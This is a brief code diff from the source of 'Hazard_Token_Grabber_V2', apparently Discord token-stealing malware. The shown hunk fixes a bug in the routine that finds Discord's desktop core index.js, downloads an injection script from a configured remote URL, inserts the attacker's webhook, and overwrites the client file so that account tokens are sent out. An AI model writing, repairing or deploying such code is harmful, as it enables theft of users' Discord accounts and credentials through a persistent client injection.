@@ -172,7 +172,7 @@ class Hazard_Token_Grabber_V2(functions):
                     if match(r'app-(\d*\.\d*)*', __dir):
                         app = os.path.abspath(disc_sep+__dir)
                         inj_path = app+'\\modules\\discord_desktop_core-2\\discord_desktop_core\\index.js'
-                        if os.path.exist(inj_path):
+                        if os.path.exists(inj_path):
                             f = httpx.get(self.config('injection_url')).text.replace(
                                 "%WEBHOOK%", self.webhook)
                             with open(inj_path, 'w', errors="ignore") as indexFile:
